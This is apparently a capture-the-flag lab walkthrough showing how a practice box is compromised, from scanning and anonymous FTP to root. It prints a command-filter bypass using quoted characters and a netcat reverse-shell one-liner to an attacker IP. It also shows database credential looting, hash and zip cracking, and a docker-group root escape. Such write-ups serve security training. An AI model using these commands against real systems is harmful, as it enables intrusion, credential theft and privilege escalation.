# Enumeration

We begin with full nmap scan followed by a detailed scan.

![7e3d297554b5965c48cd31ed64571b62.png](./_resources/7e3d297554b5965c48cd31ed64571b62.png)

![bfebb6b9c368d9cfb37145805943cc0b.png](./_resources/bfebb6b9c368d9cfb37145805943cc0b.png)

Since we have anonymous access to the ftp server, we can take a look. There, we fine a `note.txt` file.

![2a8a9426e2a0151f4220162866868c69.png](./_resources/2a8a9426e2a0151f4220162866868c69.png)

![df58dacb66632806248e04c56bece2c1.png](./_resources/df58dacb66632806248e04c56bece2c1.png)

Let's investigate the web server. A quick gobuster scan reveals a `/secret` directory, which we can seemingly use for command injection.

<br>

# Exploitation

![4e73a364dd3bdc1d5fdd78b250c83e39.png](./_resources/4e73a364dd3bdc1d5fdd78b250c83e39.png)

Trying out, for instance, the `id` command gives us a result.

![bfe98c5a48fc727eec1dba1019936143.png](./_resources/bfe98c5a48fc727eec1dba1019936143.png)

However, as indicated by the note we found, there is a filter on the commands we are allowed to input. For instance, attempting to use `cat` or `python` yields an error. The source codes reveals the forbidden commands:

![35a26288e1ddbf071d6837cf34dda127.png](./_resources/35a26288e1ddbf071d6837cf34dda127.png)

One way to bypass this is to use double quotations. For instance, instead of `ls` we can execute `l"s"`, and we see that this works.

![fbe9dcb0cce8d5856a756e5fbaf21395.png](./_resources/fbe9dcb0cce8d5856a756e5fbaf21395.png)

Now let's use the above method to execute a command to spawn a reverse shell using one of [these one-liners](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Set up a netcat listener. We use:

```txt
r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker IP> 9999 >/tmp/f
```

This goes through, and we catch our reverse shell.

![731d535bb57b11ab16fcd54043c4f76a.png](./_resources/731d535bb57b11ab16fcd54043c4f76a.png)

If we look around in the `/var/www` directory, we eventually find a `/files` subdirectory. The `index.php` file there contains some mysql credentials.

![f79e24313f86da81d506bd147df1c4ae.png](./_resources/f79e24313f86da81d506bd147df1c4ae.png)

We can use this to access the mysql database as the root user.

![913768cef6ed203a38b3d58d1379c680.png](./_resources/913768cef6ed203a38b3d58d1379c680.png)

Use `show databases;` to list the available databases. The `webportal` database looks interesting; execute `use webportal;` to change into that database. Using `show tables;` we find a `users` table; we get the columns with `describe users;`.

![89ca192f4cf8c3e248789c2879a0d172.png](./_resources/89ca192f4cf8c3e248789c2879a0d172.png)

Now use `select * from users` to get all the information from the `users` table.

![73f42f53ef20ef8fc66e167bb65d8916.png](./_resources/73f42f53ef20ef8fc66e167bb65d8916.png)

We get the information of two users with what appear to be hashed passwords. Running the hashes through a hash identifier, we determine that they are MD5 hashes. Now, we can either use a tool like hashcat to crack the hashes, or we can just use an online tool like [CrackStation](https://crackstation.net/). The latter immediately gets us the two passwords.

![803c4655d8d70e67a82511b5c8992bc0.png](./_resources/803c4655d8d70e67a82511b5c8992bc0.png)

Unfortunately, this seems to be a rabbit hole -- none of the passwords we found work for either ftp or ssh. We'll move on for now.

Within the same directory as the `index.php` file, we also found a `hacker.php` file. Catting it out reveals what looks like a hint.

![911da3281b593d7ed3b0762efbdcf8bb.png](./_resources/911da3281b593d7ed3b0762efbdcf8bb.png)

The image referenced in the source code is in the `/images` subdirectory. Let's pull it to our local machine by setting up an http server on the target with python. Opening the image reveals that it is, indeed, a photo of a hacker with a laptop.

![63edb9dd7b2692f2bfc45bb17d95f671.png](./_resources/63edb9dd7b2692f2bfc45bb17d95f671.png)

Since the hint told us to look in the dark, this suggests using some [steganography tools](https://0xrick.github.io/lists/stego/). We'll try steghide.

![57b615cbc5f4a1777002c218ecba98db.png](./_resources/57b615cbc5f4a1777002c218ecba98db.png)

When prompted for a password, we try pressing enter (since we don't have a password). Surprisingly, this works; a `backup.zip` file is extracted. Unfortunately, we don't have the password needed to unzip it.

![b6f24eea06897bcae06b71e83c114341.png](./_resources/b6f24eea06897bcae06b71e83c114341.png)

To get around this, we can use john. First, let's use `zip2john backup.zip > backup.txt` to convert the zip file, then we use john to crack the password.

![09fa2f042a2f96ee64fc79b951b231ce.png](./_resources/09fa2f042a2f96ee64fc79b951b231ce.png)

Now we can unzip the file to obtain a `source_code.php` file. Catting it out reveals a base64-encoded password for (presumably) anurodh, which we easily decode.

![e5ee74f131a225fbf895584ead0ee0d8.png](./_resources/e5ee74f131a225fbf895584ead0ee0d8.png)

This turns out to be anurodh's ssh password.

![4af7add8c7e33849d6e01b1e89315c55.png](./_resources/4af7add8c7e33849d6e01b1e89315c55.png)

<br>

# Post-Exploitation

We can ssh in as anurodh, but unfortunately we still don't have access to any flags. However, using `id` we see that anurodh is part of the docker group.

![7f472941955bca7e1d09e298fbb1c022.png](./_resources/7f472941955bca7e1d09e298fbb1c022.png)

Checking [GTFOBins](https://gtfobins.github.io/gtfobins/docker/), we see that we can use this to escape to a root shell. Simply run `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.

![18baaaeab642c540e165207d92bff451.png](./_resources/18baaaeab642c540e165207d92bff451.png)

Just like that, we're root! Let's get a better shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.  Looking around, we easily find the two flags.

![2a0cf65c4bc70fbf61ebbb23e976d1bc.png](./_resources/2a0cf65c4bc70fbf61ebbb23e976d1bc.png)


Note that there is an alternative method we can use to obtain the `local.txt` flag. Once we gain initial access as the www-data user, we can find the first glag in apaar's home directory. Unfortunately, we don't have access. If we use `sudo -l`, we see that we can run a script in apaar's home directory using apaar's privileges.

![fbd1f75170e00d76d6fefb28b18b8452.png](./_resources/fbd1f75170e00d76d6fefb28b18b8452.png)

Observse that we are given two inputs; the `$msg`  input is sent to `/dev/null`. We can use this to elevate our privileges to that of apaar by inputting `/bin/bash` for the second input. This spawns a shell as apaar. We can then read the `local.txt` flag.

![f1cfbdfcc06d531b1e803e6d239e7881.png](./_resources/f1cfbdfcc06d531b1e803e6d239e7881.png)